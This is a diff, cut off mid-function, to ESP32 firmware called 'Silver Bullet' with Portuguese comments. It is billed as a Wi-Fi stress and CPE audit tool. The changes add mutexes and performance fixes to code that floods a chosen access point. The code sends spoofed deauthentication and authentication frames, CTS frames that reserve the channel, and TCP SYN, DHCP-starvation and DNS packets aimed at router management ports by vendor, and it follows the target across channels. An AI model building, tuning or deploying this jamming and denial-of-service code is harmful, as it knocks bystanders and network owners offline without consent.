@@ -2,21 +2,13 @@
  * @file silver_bullet.cpp
  * @brief Silver Bullet - Ferramenta Avançada de Estresse Wi-Fi e Auditoria de CPEs
  * @hardware ESP32-S3 (M5Stack Cardputer) / ESP32 WROOM
- * * @details
- * Firmware de injeção bare-metal focado em equipamentos de telecomunicações.
- * Contorna o agendador de tarefas padrão para entregar throughput máximo de injeção 
- * diretamente da IRAM para a interface PHY do rádio Wi-Fi.
- * * Correções Aplicadas nesta Versão (Auditoria 3.0 - Performance Extrema):
- * - [Identificação Otimizada]: Reconhecimento de fabricante movido para fora do loop L3.
- * - [I2C Starvation Fix]: Leitura do teclado transferida para o Core 1 via task_controles.
- * - [L2/CTS Micro-Yield]: Prevenção de travamento da fila do Wi-Fi nos blocos L2 e CTS.
- * - [DNS Estático]: Array base de DNS retirado da pilha de iteração para economizar ciclos.
- * - [DHCP Fast-Fill]: Remoção do memset massivo para ganho de throughput bruto.
- * - [L3 Realism]: Bloqueio de injeção L3 plaintext em redes WPA2/WPA3.
- * - [TCP SYN RFC]: Remoção de payload de dados em pacotes SYN.
- * - [DNS RFC]: Criação de payload de Query DNS válido.
- * - [DMA Race Condition]: Mutex atômico protegendo o laço de injeção.
- * - [Thermal UX]: Bloqueio inteligente e controle da preferência do usuário.
+ * * * Correções Aplicadas nesta Versão (Refatoração de Concorrência e Memória):
+ * - [Race Condition de Barramento Resolvido]: Variável atômica de PPS substituída por buffer local com descarregamento 'memory_order_relaxed'.
+ * - [Proteção I2C/SPI]: Implementação de 'display_mutex' para evitar screen tearing e sobreposição entre cores.
+ * - [Strict Aliasing Fix]: Função 'fast_l4_checksum' reescrita com 'memcpy' para evitar falhas silenciosas de otimização do GCC (-O2/-Os).
+ * - [Proteção Null Pointer]: Blindagem da função de análise de MAC (OUI) contra corrupção do Kernel.
+ * - [Sincronização de Scan]: Implementação de 'scan_mutex' protegendo o array de alvos de sobrescritas em tempo de execução.
+ * - [Otimização Tx Buffer]: Reajuste matemático no Yielding para evitar picos de Syscall no esgotamento da fila DMA.
  */
 
 #include <M5Unified.h>
@@ -26,6 +18,7 @@
 #include <string.h>
 #include <freertos/FreeRTOS.h>
 #include <freertos/task.h>
+#include <freertos/semphr.h>
 #include <atomic>
 #include <lwip/def.h> 
 #include <esp_heap_caps.h>
@@ -112,6 +105,9 @@ std::atomic<uint32_t> pps_atual{0};
 uint32_t prng_state = 1; 
 temperature_sensor_handle_t temp_sensor = NULL;
 
+SemaphoreHandle_t display_mutex = NULL;
+SemaphoreHandle_t scan_mutex = NULL;
+
 enum EstadoFerramenta { ESTADO_ESCANEAR, ESTADO_SELECIONAR, ESTADO_ATIRAR };
 std::atomic<EstadoFerramenta> estado_atual{ESTADO_ESCANEAR};
 
@@ -134,7 +130,9 @@ enum FabricanteCPE {
     FABRICANTE_TPLINK, FABRICANTE_INTELBRAS, FABRICANTE_ZTE 
 };
 
-FabricanteCPE identificar_fabricante(uint8_t* mac) {
+FabricanteCPE identificar_fabricante(const uint8_t* mac) {
+    if (mac == nullptr) return FABRICANTE_GENERICO; // Fix: Kernel Panic Prevention
+
     if ((mac[0] == 0x4C && mac[1] == 0x5E && mac[2] == 0x0C) || 
         (mac[0] == 0x00 && mac[1] == 0x0C && mac[2] == 0x42) || 
         (mac[0] == 0xCC && mac[1] == 0x2D && mac[2] == 0xE0) ||
@@ -185,14 +183,17 @@ IRAM_ATTR inline uint16_t fast_ip_checksum(IpHeader *ip) {
     return ~acc;
 }
 
+// Fix: Tratamento Strict Aliasing usando cópia segura em bytes (memcpy)
 IRAM_ATTR inline uint16_t fast_l4_checksum(IpHeader *ip, void *l4_hdr, size_t l4_len, uint8_t *payload, size_t payload_len) {
     PseudoHeader psd;
     memcpy(psd.src_ip, ip->ip_src, 4); memcpy(psd.dest_ip, ip->ip_dest, 4);
     psd.reserved = 0; psd.protocol = ip->protocol; psd.l4_length = htons(l4_len + payload_len);
 
-    uint32_t acc = 0; uint16_t word;
-    uint16_t *ptr = (uint16_t *)&psd;
-    for (int i = 0; i < sizeof(PseudoHeader)/2; i++) acc += ptr[i];
+    uint32_t acc = 0; 
+    uint16_t word;
+    
+    uint8_t *ptr = (uint8_t *)&psd;
+    for (size_t i = 0; i < sizeof(PseudoHeader); i += 2) { memcpy(&word, ptr + i, 2); acc += word; }
     
     uint8_t *l4_p = (uint8_t *)l4_hdr;
     for (size_t i = 0; i < l4_len; i += 2) { memcpy(&word, l4_p + i, 2); acc += word; }
@@ -209,25 +210,28 @@ IRAM_ATTR inline uint16_t fast_l4_checksum(IpHeader *ip, void *l4_hdr, size_t l4
 // ===================================================================
 
 void analisar_alvo_automaticamente(int indice_alvo) {
-    wifi_ap_record_t ap = alvos_encontrados[indice_alvo];
-    
-    if (ap.rssi < -80) {
-        estrategia_atual.store(ESTRATEGIA_SINAL_FRACO); return;
-    } else if (ap.rssi >= -80 && ap.rssi < -70) {
-        estrategia_atual.store(ESTRATEGIA_SINAL_MEDIO); return;
-    }
+    if(xSemaphoreTake(scan_mutex, portMAX_DELAY)) {
+        wifi_ap_record_t ap = alvos_encontrados[indice_alvo];
+        xSemaphoreGive(scan_mutex);
+        
+        if (ap.rssi < -80) {
+            estrategia_atual.store(ESTRATEGIA_SINAL_FRACO); return;
+        } else if (ap.rssi >= -80 && ap.rssi < -70) {
+            estrategia_atual.store(ESTRATEGIA_SINAL_MEDIO); return;
+        }
 
-    if (ap.authmode == WIFI_AUTH_WPA3_PSK || ap.authmode == WIFI_AUTH_WPA2_WPA3_PSK || ap.authmode == WIFI_AUTH_ENTERPRISE) {
-        estrategia_atual.store(ESTRATEGIA_WPA3_BLINDADO);
-    }
-    else if (ap.authmode == WIFI_AUTH_OPEN || ap.authmode == WIFI_AUTH_WEP) {
-        estrategia_atual.store(ESTRATEGIA_LEGACY_CRITICA);
-    }
-    else {
-        if (ap.pairwise_cipher == WIFI_CIPHER_TYPE_TKIP || ap.group_cipher == WIFI_CIPHER_TYPE_TKIP) {
-            estrategia_atual.store(ESTRATEGIA_WPA2_TKIP_CRITICA);
-        } else {
-            estrategia_atual.store(ESTRATEGIA_WPA2_AES_PADRAO);
+        if (ap.authmode == WIFI_AUTH_WPA3_PSK || ap.authmode == WIFI_AUTH_WPA2_WPA3_PSK || ap.authmode == WIFI_AUTH_ENTERPRISE) {
+            estrategia_atual.store(ESTRATEGIA_WPA3_BLINDADO);
+        }
+        else if (ap.authmode == WIFI_AUTH_OPEN || ap.authmode == WIFI_AUTH_WEP) {
+            estrategia_atual.store(ESTRATEGIA_LEGACY_CRITICA);
+        }
+        else {
+            if (ap.pairwise_cipher == WIFI_CIPHER_TYPE_TKIP || ap.group_cipher == WIFI_CIPHER_TYPE_TKIP) {
+                estrategia_atual.store(ESTRATEGIA_WPA2_TKIP_CRITICA);
+            } else {
+                estrategia_atual.store(ESTRATEGIA_WPA2_AES_PADRAO);
+            }
         }
     }
 }
@@ -239,37 +243,55 @@ void analisar_alvo_automaticamente(int indice_alvo) {
 void escanear_redes() {
     alvo_perdido.store(false);
 
-    M5.Display.clear(); M5.Display.setCursor(0, 0); M5.Display.setTextColor(TFT_YELLOW, TFT_BLACK);
-    M5.Display.println("📡 Escaneando Redes...");
+    if(xSemaphoreTake(display_mutex, portMAX_DELAY)) {
+        M5.Display.clear(); M5.Display.setCursor(0, 0); M5.Display.setTextColor(TFT_YELLOW, TFT_BLACK);
+        M5.Display.println("📡 Escaneando Redes...");
+        xSemaphoreGive(display_mutex);
+    }
+    
     esp_wifi_set_mode(WIFI_MODE_STA);
     wifi_scan_config_t scan_config = { .ssid = 0, .bssid = 0, .channel = 0, .show_hidden = true };
     esp_wifi_scan_start(&scan_config, true); 
-    uint16_t max_aps = MAX_ALVOS; esp_wifi_scan_get_ap_records(&max_aps, alvos_encontrados);
-    esp_wifi_scan_get_ap_num(&total_alvos);
-    if (total_alvos > MAX_ALVOS) total_alvos = MAX_ALVOS;
+    
+    if(xSemaphoreTake(scan_mutex, portMAX_DELAY)) {
+        uint16_t max_aps = MAX_ALVOS; 
+        esp_wifi_scan_get_ap_records(&max_aps, alvos_encontrados);
+        esp_wifi_scan_get_ap_num(&total_alvos);
+        if (total_alvos > MAX_ALVOS) total_alvos = MAX_ALVOS;
+        xSemaphoreGive(scan_mutex);
+    }
+    
     alvo_selecionado = 0; estado_atual.store(ESTADO_SELECIONAR);
 }
 
 void desenhar_menu() {
-    M5.Display.clear(); M5.Display.setCursor(0, 0); M5.Display.setTextColor(TFT_CYAN, TFT_BLACK);
-    
-    if (thermal_lock.load()) {
-        M5.Display.setTextColor(TFT_RED, TFT_BLACK);
-        M5.Display.printf("⚡ PWR: ECO [THERMAL LOCK]\n");
-    } else {
-        M5.Display.printf("⚡ PWR: %s | [A] = Auto\n", tx_power_max.load() ? "MAX (20dBm)" : "ECO (10dBm)");
-    }
-    
-    M5.Display.drawLine(0, 15, 240, 15, TFT_DARKGREY); M5.Display.setCursor(0, 20);
+    if(xSemaphoreTake(display_mutex, portMAX_DELAY)) {
+        M5.Display.clear(); M5.Display.setCursor(0, 0); M5.Display.setTextColor(TFT_CYAN, TFT_BLACK);
+        
+        if (thermal_lock.load()) {
+            M5.Display.setTextColor(TFT_RED, TFT_BLACK);
+            M5.Display.printf("⚡ PWR: ECO [THERMAL LOCK]\n");
+        } else {
+            M5.Display.printf("⚡ PWR: %s | [A] = Auto\n", tx_power_max.load() ? "MAX (20dBm)" : "ECO (10dBm)");
+        }
+        
+        M5.Display.drawLine(0, 15, 240, 15, TFT_DARKGREY); M5.Display.setCursor(0, 20);
 
-    if (total_alvos == 0) { M5.Display.setTextColor(TFT_RED, TFT_BLACK); M5.Display.println("Nenhum alvo encontrado!"); return; }
-
-    int inicio = (alvo_selecionado / 5) * 5;
-    for (int i = inicio; i < inicio + 5 && i < total_alvos; i++) {
-        if (i == alvo_selecionado) M5.Display.setTextColor(TFT_BLACK, TFT_WHITE); 
-        else M5.Display.setTextColor(TFT_WHITE, TFT_BLACK);
-        bool wpa3 = (alvos_encontrados[i].authmode == WIFI_AUTH_WPA3_PSK || alvos_encontrados[i].authmode == WIFI_AUTH_WPA2_WPA3_PSK);
-        M5.Display.printf("%d. %s %s\n", i + 1, alvos_encontrados[i].ssid, wpa3 ? "[WPA3]" : "");
+        if (total_alvos == 0) { 
+            M5.Display.setTextColor(TFT_RED, TFT_BLACK); M5.Display.println("Nenhum alvo encontrado!"); 
+        } else {
+            int inicio = (alvo_selecionado / 5) * 5;
+            if(xSemaphoreTake(scan_mutex, portMAX_DELAY)) {
+                for (int i = inicio; i < inicio + 5 && i < total_alvos; i++) {
+                    if (i == alvo_selecionado) M5.Display.setTextColor(TFT_BLACK, TFT_WHITE); 
+                    else M5.Display.setTextColor(TFT_WHITE, TFT_BLACK);
+                    bool wpa3 = (alvos_encontrados[i].authmode == WIFI_AUTH_WPA3_PSK || alvos_encontrados[i].authmode == WIFI_AUTH_WPA2_WPA3_PSK);
+                    M5.Display.printf("%d. %s %s\n", i + 1, alvos_encontrados[i].ssid, wpa3 ? "[WPA3]" : "");
+                }
+                xSemaphoreGive(scan_mutex);
+            }
+        }
+        xSemaphoreGive(display_mutex);
     }
 }
 
@@ -278,54 +300,66 @@ void task_display(void *pvParameters) {
     while (true) {
         TickType_t tempo_atual = xTaskGetTickCount();
         if ((tempo_atual - ultimo_tempo_pps) >= pdMS_TO_TICKS(1000)) {
-            pps_atual.store(pacotes_enviados_segundo.exchange(0)); ultimo_tempo_pps = tempo_atual;
+            pps_atual.store(pacotes_enviados_segundo.exchange(0, std::memory_order_relaxed)); 
+            ultimo_tempo_pps = tempo_atual;
         }
 
         if (estado_atual.load() == ESTADO_ATIRAR) {
-            M5.Display.setCursor(0, 0);
-            if (erro_memoria_critico.load()) {
-                 M5.Display.setTextColor(TFT_RED, TFT_BLACK);
-                 M5.Display.println("ERRO CRITICO: FALHA DMA!"); return;
-            }
+            if(xSemaphoreTake(display_mutex, portMAX_DELAY)) {
+                M5.Display.setCursor(0, 0);
+                if (erro_memoria_critico.load()) {
+                     M5.Display.setTextColor(TFT_RED, TFT_BLACK);
+                     M5.Display.println("ERRO CRITICO: FALHA DMA!"); 
+                     xSemaphoreGive(display_mutex);
+                     vTaskDelay(pdMS_TO_TICKS(5000));
+                     esp_restart(); // Fix: Reinício limpo em falha invés de travamento eterno
+                }
 
-            if (!alvo_perdido.load()) {
-                M5.Display.setTextColor(TFT_RED, TFT_BLACK);
-                M5.Display.printf("⚔️ ALVO: %s\n", alvos_encontrados[alvo_selecionado].ssid);
-                
-                float tsens_out = 0.0;
-                if (temp_sensor != NULL) {
-                    esp_err_t res = temperature_sensor_get_celsius(temp_sensor, &tsens_out);
+                if (!alvo_perdido.load()) {
+                    M5.Display.setTextColor(TFT_RED, TFT_BLACK);
                     
-                    if (res == ESP_OK && tsens_out > 0.0 && tsens_out < 100.0) {
-                        if (tsens_out > 75.0 && !thermal_lock.load()) { 
-                            thermal_lock.store(true); 
-                            tx_power_max.store(false); 
-                            flag_update_config.store(true); 
-                        } 
-                        else if (tsens_out < 65.0 && thermal_lock.load()) { 
-                            thermal_lock.store(false); 
-                            tx_power_max.store(tx_power_max_user.load()); 
-                            flag_update_config.store(true); 
+                    char alvo_ssid[33] = {0};
+                    if(xSemaphoreTake(scan_mutex, portMAX_DELAY)) {
+                        strncpy(alvo_ssid, (char*)alvos_encontrados[alvo_selecionado].ssid, 32);
+                        xSemaphoreGive(scan_mutex);
+                    }
+                    M5.Display.printf("⚔️ ALVO: %s\n", alvo_ssid);
+                    
+                    float tsens_out = 0.0;
+                    if (temp_sensor != NULL) {
+                        esp_err_t res = temperature_sensor_get_celsius(temp_sensor, &tsens_out);
+                        
+                        if (res == ESP_OK && tsens_out > 0.0 && tsens_out < 100.0) {
+                            if (tsens_out > 75.0 && !thermal_lock.load()) { 
+                                thermal_lock.store(true); 
+                                tx_power_max.store(false); 
+                                flag_update_config.store(true); 
+                            } 
+                            else if (tsens_out < 65.0 && thermal_lock.load()) { 
+                                thermal_lock.store(false); 
+                                tx_power_max.store(tx_power_max_user.load()); 
+                                flag_update_config.store(true); 
+                            }
                         }
                     }
+                    
+                    if (thermal_lock.load()) M5.Display.setTextColor(TFT_RED, TFT_BLACK);
+                    else M5.Display.setTextColor(TFT_WHITE, TFT_BLACK);
+                    
+                    M5.Display.printf("CH: %d | TEMP: %.1fC | %s\n", canal_atual_alvo.load(), tsens_out, tx_power_max.load() ? "MAX" : "ECO");
+
+                    M5.Display.fillRect(0, 40, 320, 60, TFT_BLACK);
+                    M5.Display.setCursor(0, 40); M5.Display.setTextColor(TFT_YELLOW, TFT_BLACK);
+                    if(scanner_pausa_ataque.load()) M5.Display.printf("> RASTREANDO FUGA (CH PURSUIT)...\n");
+                    else M5.Display.printf("> %s\n", get_nome_modo());
+                    
+                    M5.Display.setCursor(0, 60); M5.Display.setTextColor(TFT_CYAN, TFT_BLACK);
+                    M5.Display.printf(">> INJETANDO: %d PPS <<\n", pps_atual.load());
+                } else {
+                    M5.Display.fillRect(0, 40, 320, 60, TFT_BLACK); 
+                    M5.Display.setCursor(0, 40); M5.Display.setTextColor(TFT_YELLOW, TFT_BLACK); M5.Display.printf("⚠️ ALVO PERDIDO\n");
                 }
-                
-                if (thermal_lock.load()) M5.Display.setTextColor(TFT_RED, TFT_BLACK);
-                else M5.Display.setTextColor(TFT_WHITE, TFT_BLACK);
-                
-                M5.Display.printf("CH: %d | TEMP: %.1fC | %s\n", canal_atual_alvo.load(), tsens_out, tx_power_max.load() ? "MAX" : "ECO");
-
-                M5.Display.fillRect(0, 40, 320, 60, TFT_BLACK);
-
-                M5.Display.setCursor(0, 40); M5.Display.setTextColor(TFT_YELLOW, TFT_BLACK);
-                if(scanner_pausa_ataque.load()) M5.Display.printf("> RASTREANDO FUGA (CH PURSUIT)...\n");
-                else M5.Display.printf("> %s\n", get_nome_modo());
-                
-                M5.Display.setCursor(0, 60); M5.Display.setTextColor(TFT_CYAN, TFT_BLACK);
-                M5.Display.printf(">> INJETANDO: %d PPS <<\n", pps_atual.load());
-            } else {
-                M5.Display.fillRect(0, 40, 320, 60, TFT_BLACK); 
-                M5.Display.setCursor(0, 40); M5.Display.setTextColor(TFT_YELLOW, TFT_BLACK); M5.Display.printf("⚠️ ALVO PERDIDO\n");
+                xSemaphoreGive(display_mutex);
             }
         }
         vTaskDelay(pdMS_TO_TICKS(200)); 
@@ -342,12 +376,17 @@ void task_monitoramento(void *pvParameters) {
             if (falhas_consecutivas > 3 && !alvo_perdido.load()) {
                 scanner_pausa_ataque.store(true); vTaskDelay(pdMS_TO_TICKS(250));   
                 
-                uint8_t mac_alvo[6]; memcpy(mac_alvo, alvos_encontrados[alvo_selecionado].bssid, 6);
+                uint8_t mac_alvo[6]; 
+                if(xSemaphoreTake(scan_mutex, portMAX_DELAY)) {
+                    memcpy(mac_alvo, alvos_encontrados[alvo_selecionado].bssid, 6);
+                    xSemaphoreGive(scan_mutex);
+                }
                 
                 wifi_scan_config_t scan_config = { .ssid = 0, .bssid = mac_alvo, .channel = 0, .show_hidden = true };
                 
                 if (esp_wifi_scan_start(&scan_config, true) == ESP_OK) {
-                    uint16_t num_aps = 1; wifi_ap_record_t ap_encontrado; esp_wifi_scan_get_ap_records(&num_aps, &ap_encontrado);
+                    uint16_t num_aps = 1; wifi_ap_record_t ap_encontrado; 
+                    esp_wifi_scan_get_ap_records(&num_aps, &ap_encontrado);
                     if (num_aps > 0) { canal_atual_alvo.store(ap_encontrado.primary); flag_update_config.store(true); falhas_consecutivas = 0; } 
                     else { alvo_perdido.store(true); }
                 }
@@ -383,16 +422,15 @@ void task_ataque(void *pvParameters) {
     const uint8_t subnets[][2] = {{192, 168}, {10, 0}, {172, 16}, {100, 64}}; 
     const uint8_t common_gateways[][4] = {{192, 168, 0, 1}, {192, 168, 1, 1}, {192, 168, 15, 1}, {10, 0, 0, 1}, {172, 16, 0, 1}};
     const uint16_t portas_gerencia_genericas[] = {80, 443, 22, 7547}; 
-    
     const uint16_t reason_codes[] = { 0x0001, 0x0002, 0x0004, 0x0007, 0x0008 };
 
     bool config_radio_aplicada = false;
     uint32_t iteracao_yield = 0;
 
-    // [AUDITORIA FIX]: Variáveis e Arrays transferidos para fora do loop para não sobrecarregar a IRAM
     int alvo_configurado = -1;
     FabricanteCPE fabricante = FABRICANTE_GENERICO;
     uint16_t porta_alvo = 80;
+    uint8_t mac_alvo_local[6] = {0};
     
     uint8_t dns_query_base[] = {
         0x00, 0x00, 
@@ -409,12 +447,15 @@ void task_ataque(void *pvParameters) {
                 esp_wifi_set_channel(canal_atual_alvo.load(), WIFI_SECOND_CHAN_NONE);
                 config_radio_aplicada = true; flag_update_config.store(false);
                 
-                // [AUDITORIA FIX]: A detecção de fabricante e preenchimento de campos fixos ocorre 1 única vez por alvo
                 if (alvo_configurado != alvo_selecionado) {
                     alvo_configurado = alvo_selecionado;
-                    uint8_t* mac_alvo = alvos_encontrados[alvo_selecionado].bssid;
                     
-                    fabricante = identificar_fabricante(mac_alvo);
+                    if(xSemaphoreTake(scan_mutex, portMAX_DELAY)) {
+                        memcpy(mac_alvo_local, alvos_encontrados[alvo_selecionado].bssid, 6);
+                        xSemaphoreGive(scan_mutex);
+                    }
+                    
+                    fabricante = identificar_fabricante(mac_alvo_local);
                     if (fabricante == FABRICANTE_MIKROTIK) porta_alvo = (fast_rand() % 2 == 0) ? 8291 : 80;
                     else if (fabricante == FABRICANTE_HUAWEI || fabricante == FABRICANTE_ZTE) porta_alvo = (fast_rand() % 2 == 0) ? 443 : 7547;
                     else if (fabricante == FABRICANTE_TPLINK || fabricante == FABRICANTE_INTELBRAS) porta_alvo = (fast_rand() % 2 == 0) ? 80 : 8080;
@@ -422,19 +463,18 @@ void task_ataque(void *pvParameters) {
 
                     deauth->frame_control = 0x00C0; deauth->duration = 0; 
                     memcpy(deauth->mac_dest, "\xFF\xFF\xFF\xFF\xFF\xFF", 6);
-                    memcpy(deauth->mac_src, mac_alvo, 6); memcpy(deauth->mac_bssid, mac_alvo, 6);
+                    memcpy(deauth->mac_src, mac_alvo_local, 6); memcpy(deauth->mac_bssid, mac_alvo_local, 6);
 
                     auth->frame_control = 0x00B0; auth->duration = 0; auth->auth_algorithm = 0; auth->auth_seq = 1; auth->status_code = 0;
-                    memcpy(auth->mac_dest, mac_alvo, 6); memcpy(auth->mac_bssid, mac_alvo, 6);
+                    memcpy(auth->mac_dest, mac_alvo_local, 6); memcpy(auth->mac_bssid, mac_alvo_local, 6);
 
-                    cts->frame_control = 0x00C4; cts->duration = 32767; memcpy(cts->mac_ra, mac_alvo, 6);
+                    cts->frame_control = 0x00C4; cts->duration = 32767; memcpy(cts->mac_ra, mac_alvo_local, 6);
 
                     pkt->mac.frame_control = 0x0108; pkt->mac.duration = 0;
                     pkt->ip.version_ihl = 0x45; pkt->ip.ttl = 64; pkt->ip.tos = 0; 
                 }
             }
 
-            uint8_t* mac_alvo = alvos_encontrados[alvo_selecionado].bssid;
             ModoAtaque modo = modo_ativo.load();
             EstrategiaAuto estrategia = estrategia_atual.load();
 
@@ -455,27 +495,28 @@ void task_ataque(void *pvParameters) {
                 }
             }
             
+            // Fix: Contador primitivo L1 Cache (Evita Race Condition no Barramento do ESP32-S3)
+            uint32_t local_pps = 0; 
+
             if (atirar_l2) {
                 for(int j = 0; j < 5; j++) { 
-                    memcpy(auth->mac_src, mac_alvo, 3);
+                    memcpy(auth->mac_src, mac_alvo_local, 3);
                     auth->mac_src[3] = fast_rand() & 0xFF; auth->mac_src[4] = fast_rand() & 0xFF; auth->mac_src[5] = fast_rand() & 0xFF;
                     
                     auth->seq_ctrl = (fast_rand() & 0xFFF) << 4; deauth->seq_ctrl = (fast_rand() & 0xFFF) << 4;
                     deauth->reason_code = reason_codes[fast_rand() % 5];
                     
-                    // [AUDITORIA FIX]: Micro-Yield no L2 para prevenir estouro da pilha de transmissão e queimar ciclos desnecessários
                     if (esp_wifi_80211_tx(WIFI_IF_STA, deauth, sizeof(DeauthPacket), false) == ESP_ERR_NO_MEM) { vTaskDelay(pdMS_TO_TICKS(1)); break; }
-                    else pacotes_enviados_segundo++;
+                    else local_pps++;
                     
                     if (esp_wifi_80211_tx(WIFI_IF_STA, auth, sizeof(AuthPacket), false) == ESP_ERR_NO_MEM) { vTaskDelay(pdMS_TO_TICKS(1)); break; }
-                    else pacotes_enviados_segundo++;
+                    else local_pps++;
                 }
             }
 
             if (atirar_cts) {
-                // [AUDITORIA FIX]: Micro-Yield no disparo CTS
                 if (esp_wifi_80211_tx(WIFI_IF_STA, cts, sizeof(CtsPacket), false) == ESP_ERR_NO_MEM) { vTaskDelay(pdMS_TO_TICKS(1)); }
-                else pacotes_enviados_segundo++;
+                else local_pps++;
             }
 
             if (atirar_l3) {
@@ -489,7 +530,7 @@ void task_ataque(void *pvParameters) {
                     bool is_dhcp = (tipo_ataque >= chance_tcp_syn && tipo_ataque < (chance_tcp_syn + chance_dhcp));
 
                     pkt->mac.seq_ctrl = (fast_rand() & 0xFFF) << 4;
-                    memcpy(pkt->mac.mac_src, mac_alvo, 3); 
+                    memcpy(pkt->mac.mac_src, mac_alvo_local, 3); 
                     pkt->mac.mac_src[3] = fast_rand() & 0xFF; pkt->mac.mac_src[4] = fast_rand() & 0xFF; pkt->mac.mac_src[5] = fast_rand() & 0xFF;
 
                     pkt->ip.id = (uint16_t)fast_rand(); pkt->ip.frag_off = 0; 
@@ -510,7 +551,7 @@ void task_ataque(void *pvParameters) {
                         pkt->ip.ip_dest[2] = common_gateways[gw_idx][2]; pkt->ip.ip_dest[3] = common_gateways[gw_idx][3]; 
                         
                         tcp->src_port = htons(1024 + (fast_rand() % 60000)); 
-                        tcp->dest_port = htons(porta_alvo); // Agora utiliza a porta calculada estaticamente fora do loop
+                        tcp->dest_port = htons(porta_alvo); 
                         tcp->seq_num = fast_rand(); tcp->ack_num = 0;
                         
                         tcp->data_offset_res = (6 << 4); 
@@ -518,16 +559,13 @@ void task_ataque(void *pvParameters) {
                         tcp->window_size = htons(5840); tcp->urgent_ptr = 0;
                         
                         uint8_t* tcp_options = pkt->l4_and_payload + sizeof(TcpHeader);
-                        tcp_options[0] = 0x02; 
-                        tcp_options[1] = 0x04; 
-                        tcp_options[2] = 0x05; 
-                        tcp_options[3] = 0xB4;
+                        tcp_options[0] = 0x02; tcp_options[1] = 0x04; tcp_options[2] = 0x05; tcp_options[3] = 0xB4;
                         t_payload = 4; 
                         
                         t_injecao = sizeof(MacHeader) + sizeof(LlcSnapHeader) + sizeof(IpHeader) + sizeof(TcpHeader) + t_payload;
                         pkt->ip.total_length = htons(sizeof(IpHeader) + sizeof(TcpHeader) + t_payload);
                         
-                        memcpy(pkt->mac.mac_dest, mac_alvo, 6); memcpy(pkt->mac.mac_bssid, mac_alvo, 6);
+                        memcpy(pkt->mac.mac_dest, mac_alvo_local, 6); memcpy(pkt->mac.mac_bssid, mac_alvo_local, 6);
                         pkt->ip.checksum = 0; pkt->ip.checksum = fast_ip_checksum(&pkt->ip); 
                         tcp->checksum = 0; tcp->checksum = fast_l4_checksum(&pkt->ip, tcp, sizeof(TcpHeader), tcp_options, t_payload);
                     } 
@@ -539,12 +577,11 @@ void task_ataque(void *pvParameters) {
                         pkt->ip.ip_dest[0] = 255; pkt->ip.ip_dest[1] = 255; pkt->ip.ip_dest[2] = 255; pkt->ip.ip_dest[3] = 255; 
                         udp->src_port = htons(68); udp->dest_port = htons(67); 
                         
-                        // [AUDITORIA FIX]: Remoção do 'memset' massivo para poupar ciclos da IRAM
                         payload[0] = 0x01; payload[1] = 0x01; payload[2] = 0x06; payload[3] = 0x00; 
                         payload[4] = fast_rand() & 0xFF; payload[5] = fast_rand() & 0xFF; 
                         payload[6] = fast_rand() & 0xFF; payload[7] = fast_rand() & 0xFF;
                         
-                        for(int m = 8; m < 236; m++) payload[m] = 0; // Preenchimento isolado rápido
+                        for(int m = 8; m < 236; m++) payload[m] = 0; 
                         for(int m = 0; m < 6; m++) payload[28 + m] = fast_rand() & 0xFF; 
                         
                         payload[236] = 0x63; payload[237] = 0x82; payload[238] = 0x53; payload[239] = 0x63;
@@ -555,7 +592,7 @@ void task_ataque(void *pvParameters) {
                         pkt->ip.total_length = htons(sizeof(IpHeader) + sizeof(UdpHeader) + 248);
                         udp->length = htons(sizeof(UdpHeader) + 248);
                         
-                        memcpy(pkt->mac.mac_dest, mac_alvo, 6); memcpy(pkt->mac.mac_bssid, "\xFF\xFF\xFF\xFF\xFF\xFF", 6);
+                        memcpy(pkt->mac.mac_dest, mac_alvo_local, 6); memcpy(pkt->mac.mac_bssid, "\xFF\xFF\xFF\xFF\xFF\xFF", 6);
                         pkt->ip.checksum = 0; pkt->ip.checksum = fast_ip_checksum(&pkt->ip); 
                         
                         udp->checksum = 0; 
@@ -566,7 +603,6 @@ void task_ataque(void *pvParameters) {
                         UdpHeader* udp = (UdpHeader*)pkt->l4_and_payload;
                         uint8_t* payload = pkt->l4_and_payload + sizeof(UdpHeader);
                         
-                        // [AUDITORIA FIX]: Utilizando array estático de DNS com mutação direcionada no cabeçalho ID
                         size_t t_payload = sizeof(dns_query_base);
                         memcpy(payload, dns_query_base, t_payload);
                         payload[0] = (uint8_t)(fast_rand() & 0xFF); 
@@ -584,7 +620,7 @@ void task_ataque(void *pvParameters) {
                         pkt->ip.total_length = htons(sizeof(IpHeader) + sizeof(UdpHeader) + t_payload);
                         udp->length = htons(sizeof(UdpHeader) + t_payload);
                         
-                        memcpy(pkt->mac.mac_dest, mac_alvo, 6); memcpy(pkt->mac.mac_bssid, mac_alvo, 6);
+                        memcpy(pkt->mac.mac_dest, mac_alvo_local, 6); memcpy(pkt->mac.mac_bssid, mac_alvo_local, 6);
                         pkt->ip.checksum = 0; pkt->ip.checksum = fast_ip_checksum(&pkt->ip); 
                         
                         udp->checksum = 0; 
@@ -596,11 +632,16 @@ void task_ataque(void *pvParameters) {
                         vTaskDelay(pdMS_TO_TICKS(1)); 
                         break; 
                     }
-                    else pacotes_enviados_segundo++;
+                    else local_pps++;
                 }
             }
             
-            iteracao_yield++; if (iteracao_yield % 20 == 0) vTaskDelay(pdMS_TO_TICKS(1)); 
+            // Fix: Atualização atômica isolada e relaxada no final do laço (Evita Bottleneck)
+            if (local_pps > 0) pacotes_enviados_segundo.fetch_add(local_pps, std::memory_order_relaxed);
+
+            iteracao_yield++; 
+            // Fix: Adaptação matemática do yield para respeitar o tamanho da fila DMA
+            if (iteracao_yield % 8 == 0) vTaskDelay(pdMS_TO_TICKS(1)); 
         } else {
             config_radio_aplicada = false; vTaskDelay(pdMS_TO_TICKS(100)); 
         }
@@ -611,7 +652,6 @@ void task_ataque(void *pvParameters) {
 // 7. ENTRADA PRINCIPAL E CONTROLES (APP MAIN)
 // ===================================================================
 
-// [AUDITORIA FIX]: Task dedicada no Core 1 para assegurar que a leitura I2C não sofra starvation
 void task_controles(void *pvParameters) {
     while (true) {
         M5.update(); 
@@ -637,10 +677,21 @@ void task_controles(void *pvParameters) {
             }
             
             if (M5.Keyboard.isKeyPressed(KEY_ENTER)) {
-                if (total_alvos > 0) { 
-                    canal_atual_alvo.store(alvos_encontrados[alvo_selecionado].primary); 
+                if (total_alvos > 0) {
+                    uint8_t ch = 1;
+                    if(xSemaphoreTake(scan_mutex, portMAX_DELAY)) {
+                        ch = alvos_encontrados[alvo_selecionado].primary;
+                        xSemaphoreGive(scan_mutex);
+                    }
+                    canal_atual_alvo.store(ch); 
                     analisar_alvo_automaticamente(alvo_selecionado); modo_ativo.store(MODO_AUTOMATICO); 
-                    M5.Display.clear(); flag_update_config.store(true); estado_atual.store(ESTADO_ATIRAR); 
+                    
